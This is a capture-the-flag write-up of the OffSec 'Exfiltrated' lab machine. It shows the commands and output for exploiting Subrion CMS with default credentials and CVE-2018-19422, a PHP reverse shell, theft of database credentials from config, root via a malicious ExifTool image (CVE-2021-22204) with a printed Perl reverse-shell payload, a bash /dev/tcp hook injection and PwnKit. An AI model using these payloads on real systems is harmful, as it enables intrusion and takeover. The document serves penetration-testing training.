# Exfiltrated

## Initial access

Ran `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.224.163
```

Open ports discovered:

- **22** — SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0))
- **80** — HTTP
  - Additional webpages:
    - `http://192.168.224.163/cron/` => redirects to `http://exfiltrated.offsec/cron/`
      - Further redirects to `http://exfiltrated.offsec`
      - Added `exfiltrated.offsec` to `/etc/hosts`:

        ```
        192.168.224.163 exfiltrated.offsec
        ```

    - `http://192.168.224.163/cron/?/` => `http://exfiltrated.offsec/cron/?/`
    - `http://192.168.224.163/updates` (403)
    - `http://192.168.224.163/front/` => `http://exfiltrated.offsec/front/`
    - `http://192.168.224.163/backup/` => `http://exfiltrated.offsec/backup/`
    - `http://192.168.224.163/tmp/` => `http://exfiltrated.offsec/tmp/`
    - `http://192.168.224.163/.gitignore`
    - `http://192.168.224.163/changelog.txt`
    - `http://192.168.224.163/install/` (403)
    - `http://192.168.224.163/license.txt`
    - `http://192.168.224.163/panel/`
    - `http://192.168.224.163/robots.txt`
    - `http://192.168.224.163/sitemap.xml`

Browsing to `http://exfiltrated.offsec` revealed the site is powered by **Subrion CMS**.

Checking `http://exfiltrated.offsec/changelog.txt` showed the final entry is `>> From 4.2.0 to 4.2.1 <<`, indicating the CMS is running version **4.2.1**.

Searched for vulnerabilities specific to Subrion 4.2.1:

```
searchsploit subrion 4.2.1
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                            | php/webapps/47469.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                             | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                          | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                   | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                           | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                              | php/webapps/51110.txt
----------------------------------------------------------------------------------- ---------------------------------
```

The CMS is vulnerable to arbitrary file upload. Downloaded the exploit script for review:

```
searchsploit -m 49876

nano 49876.py
...
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri http://target/panel")
parser.add_option('-l', '--user', action="store", dest="user", help="User credential to login")
parser.add_option('-p', '--passw', action="store", dest="passw", help="Password credential to login")
```

The exploit requires authentication credentials. Tried logging into the admin panel at `http://192.168.224.163/panel/` with default credentials `admin:admin`, which succeeded.

Ran the arbitrary file upload exploit to obtain a web shell:

```
python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: uS89lOReTGwVduqteuLVKZhReYLSxHoCvjU9lq37
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: rxphdgplrjdjxkp

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/rxphdgplrjdjxkp.phar 

$ whoami
www-data
```

The web shell sends commands through GET requests, so commands may need to be URL encoded.

Upgraded to a reverse shell using [revshells.com](https://www.revshells.com/) and caught it on `penelope`:

```
$ which php
/usr/bin/php
$ php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.208%22%2C4444%29%3B%60bash%20%3C%263%20%3E%263%202%3E%263%60%3B%27

# penelope
www-data@exfiltrated:/var/www/html/subrion/uploads$ whoami
www-data
```

Searched for the `local.txt` flag but found no results:

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ find / -name local.txt 2>/dev/null
```

Enumerated user home directories and found a `coaran` user, but `/home/coaran` has restricted permissions (`drwx--x--x`), so access was not possible as `www-data`:

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -al /home
total 12
drwxr-xr-x  3 root   root   4096 Jun 10  2021 .
drwxr-xr-x 20 root   root   4096 Jan  7  2021 ..
drwx--x--x  2 coaran coaran 4096 Jun 10  2021 coaran
```

This requires pivoting into the `coaran` user.

Searched online for Subrion database credentials, which are stored in `includes/config.inc.php` inside the installation directory. Read the configuration file:

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /var/www/html/subrion/includes/config.inc.php
<?php
/*
 * Subrion Open Source CMS 4.2.1
 * Config file generated on 10 June 2021 12:04:54
 */

define('INTELLI_CONNECT', 'mysqli');
define('INTELLI_DBHOST', 'localhost');
define('INTELLI_DBUSER', 'subrionuser');
define('INTELLI_DBPASS', 'target100');
define('INTELLI_DBNAME', 'subrion');
define('INTELLI_DBPORT', '3306');
define('INTELLI_DBPREFIX', 'sbr421_');

define('IA_SALT', '#5A7C224B51');

// debug mode: 0 - disabled, 1 - enabled
define('INTELLI_DEBUG', 0);
```

Retrieved the MySQL credentials `subrionuser:target100` and connected to the database. Enumerated all tables in the `subrion` database but found nothing useful:

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ mysql -u subrionuser -p'target100'

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| subrion            |
+--------------------+

MariaDB [(none)]> show tables from subrion;
+-------------------------------------+
| Tables_in_subrion                   |
+-------------------------------------+
| sbr421_acl_objects                  |
| sbr421_acl_privileges               |
| sbr421_admin_actions                |
| sbr421_admin_pages                  |
| sbr421_admin_pages_groups           |
| sbr421_api_tokens                   |
| sbr421_blocks                       |
| sbr421_blog_entries                 |
| sbr421_blog_entries_tags            |
| sbr421_blog_tags                    |
| sbr421_config                       |
| sbr421_config_custom                |
| sbr421_config_groups                |
| sbr421_cron                         |
| sbr421_currencies                   |
| sbr421_email_templates              |
| sbr421_favorites                    |
| sbr421_fields                       |
| sbr421_fields_groups                |
| sbr421_fields_image_types           |
| sbr421_fields_pages                 |
| sbr421_fields_relations             |
| sbr421_fields_tree_nodes            |
| sbr421_file_types                   |
| sbr421_hooks                        |
| sbr421_image_types                  |
| sbr421_image_types_filetypes        |
| sbr421_invoices                     |
| sbr421_invoices_items               |
| sbr421_items                        |
| sbr421_items_pages                  |
| sbr421_language                     |
| sbr421_languages                    |
| sbr421_logs                         |
| sbr421_members                      |
| sbr421_members_auth_providers       |
| sbr421_menus                        |
| sbr421_migrations                   |
| sbr421_modules                      |
| sbr421_objects_pages                |
| sbr421_online                       |
| sbr421_pages                        |
| sbr421_payment_gateways             |
| sbr421_payment_gateways_ipn_log     |
| sbr421_payment_plans                |
| sbr421_payment_plans_options        |
| sbr421_payment_plans_options_values |
| sbr421_payment_subscriptions        |
| sbr421_payment_transactions         |
| sbr421_positions                    |
| sbr421_search                       |
| sbr421_usergroups                   |
| sbr421_views_log                    |
+-------------------------------------+
```

Tried using the MySQL password `target100` to switch to the `coaran` user via `su`, but authentication failed.

Uploaded and ran `pspy64` to look for hidden processes:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.208/24

# Target
www-data@exfiltrated:/var/www/html/subrion/uploads$ cd /tmp
www-data@exfiltrated:/tmp$ wget http://192.168.45.208:9001/linux/enum/pspy64

www-data@exfiltrated:/tmp$ chmod +x pspy64
www-data@exfiltrated:/tmp$ ./pspy64 
...
2026/11/19 13:37:01 CMD: UID=0     PID=80467  | /bin/sh -c bash /opt/image-exif.sh 
```

Found that `/bin/sh -c bash /opt/image-exif.sh` is executed by `root` every minute.

Checked the permissions of `/opt/image-exif.sh` — it is owned by root and not writable by `www-data`:

```
www-data@exfiltrated:/tmp$ ls -al /opt/image-exif.sh
-rwxr-xr-x 1 root root 437 Jun 10  2021 /opt/image-exif.sh
```

Read the script contents:

```
www-data@exfiltrated:/tmp$ cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

The script runs `exiftool` on all JPG files within `/var/www/html/subrion/uploads/` and appends the metadata output to a randomly named file in `/opt/metadata/`.

Checked the `exiftool` version installed on the system:

```
www-data@exfiltrated:/tmp$ exiftool -ver
11.88
```

Searched for vulnerabilities in ExifTool 11.88:

```
searchsploit exiftool      
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                                          | linux/local/50911.py
----------------------------------------------------------------------------------- ---------------------------------
```

CVE-2021-22204 affects ExifTool versions prior to 12.23, including the installed version 11.88. Downloaded the exploit script for review:

```
searchsploit -m 50911

nano 50911.py
```

The exploit requires the `bzz` package (`sudo apt install bzz`).

Generated a malicious image with the exploit, targeting the host on port 4444:

```
python3 50911_modified.py -s 192.168.45.208 4444                                     
/home/kali/OSCP/50911_modified.py:61: SyntaxWarning: "\c" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\c"? A raw string is also an option.
  payload = "(metadata \"\c${"

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(4444,inet_aton('192.168.45.208')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
RUNTIME: DONE - Exploit image written to 'image.jpg'
```

Downloaded the malicious image onto the target machine into the `/var/www/html/subrion/uploads/` directory, which is watched by the cron job:

```
www-data@exfiltrated:/tmp$ cd /var/www/html/subrion/uploads
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.208:9001/image.jpg
```

Waited for the root cron job to process the image and caught a reverse shell as `root`:

```
nc -nvlp 4444                                  
listening on [any] 4444 ...
connect to [192.168.45.208] from (UNKNOWN) [192.168.224.163] 33124
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Note: `penelope` does not upgrade this reverse shell well.

Retrieved the `local.txt` flag:

```
# find / -name local.txt 2>/dev/null
/home/coaran/local.txt

# cat /home/coaran/local.txt
dda0e0ffbab9b15e6899ee8a75521df8
```

### Alternative Initial Access — sitemapGeneration hook injection

After logging into the admin panel with default credentials (`admin:admin`), navigate to **System > Hooks > Edit sitemapGeneration** in the Subrion CMS admin dashboard. Inject a PHP reverse shell payload directly into the hook code (e.g., `exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")`). Trigger the reverse shell by clicking the "generate sitemap" menu option in the admin panel. This achieves remote code execution without uploading any files, bypassing the need for the arbitrary file upload exploit (CVE-2018-19422).

Credit: [thevillagehacker — CTF Writeups (GitHub)](https://github.com/thevillagehacker/CTF-Writeups/blob/main/Writeups/2023-08-26-Proving_grounds_Practice-Exfiltrated.md)

Retrieved the `proof.txt` flag:

```
# cd /root
# cat proof.txt
e8332e49d5d6e67641861332dcdfbfb1
```

### Alternative Privilege Escalation — PwnKit (CVE-2021-4034)

The target has `/usr/bin/pkexec` with the SUID bit set and is vulnerable to **CVE-2021-4034** (PwnKit), a local privilege escalation affecting PolicyKit. After gaining a `www-data` shell through any initial access method, download the PwnKit exploit (e.g., from [ly4k/PwnKit](https://github.com/ly4k/PwnKit)), compile and run it to gain a root shell. This is an independent privilege escalation path that does not require the cron job or ExifTool vulnerability.

Credit: [HEKK — OFFSEC Proving Grounds Exfiltrated](https://hekk.one/writeups/offsec/pg_practice/exfiltrated)
